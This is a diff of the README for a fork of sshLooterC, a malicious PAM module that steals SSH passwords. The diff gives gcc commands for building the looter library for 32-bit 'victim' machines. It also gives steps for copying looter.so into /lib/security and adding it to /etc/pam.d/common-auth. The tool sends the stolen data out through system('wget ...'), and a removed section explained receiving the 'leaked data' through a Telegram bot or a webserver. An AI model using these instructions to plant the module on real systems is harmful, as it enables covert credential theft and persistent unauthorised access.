@@ -1,40 +1,26 @@
 # sshLooterC forked
-<pre>
-<a href="https://github.com/mthbernardes/sshLooterC">
-https://github.com/mthbernardes/sshLooterC</a>
-</pre>
+
+<a href="https://github.com/mthbernardes/sshLooterC">https://github.com/mthbernardes/sshLooterC</a>
+
 # Changes from the original project
 * Removed libcurl4-openssl-dev dependency, now using <b>system("wget ...")</b>
-* Compiled for 32bit arch on a 64bit system, you need to install <b>gcc-multilib</b> on the attacker machine.
+* Compiled for 32bit arch on a 64bit system, you need to install <b>gcc-multilib</b> on the attacker machine<br/>
 I have coded a C file, <b>callLooter.c</b> to test the library before installation on the target
-</pre>
+
+
+# Dependencies
+* [Optional] to compile the program for 32bit arch you need to install <b>gcc-multilib</b>on a 64bit system
+* PAM dev library: <b>libpam0g-dev</b>
 
 # Compilation
-<pre>
- gcc callLooter.c -o callLooter -m32 -ldl
- gcc -m32 -Werror -Wall -fPIC -shared -o looter.so looter.c
+`gcc callLooter.c -o callLooter -m32 -ldl
+ gcc -m32 -Werror -Wall -fPIC -shared -o looter.so looter2.c`
 The m32 switch is optional and allows to compile the files for a 32bit victim on a 64bit attacker machine
-</pre>
-
-
-# Install and configuration
-<pre>
-See the original project
-</pre>
-
-# Note on Telegram configuration
-<pre>
-Install a client (mobile or desktop), request a new bot @botfather, 
-then ask @userinfobot to get your user id to be used in conjunction with the bot API key.
-Alternatively you can expose your logic on a webserver to read the query string with 
-the leaked data and change the wget URL in looter.c
-</pre>
 
 # Usage
-<pre>
-See the original project, please note that you have to modify the <b>/etc/pam.d/common-auth</b> file 
-inserting <b>looter.so</b>, according to the compilation instructions
-</pre>
+Copy the <b>looter.so</b> to victim machine on <b>/lib/security</b>, then append to <b>/etc/pam.d/common-auth</b>the following lines:
+`auth optional looter.so
+account optional looter.so`
 
 # Credits
 <a href="https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html" target="_blank">Stealing SSH credentials Another Approach.</a>
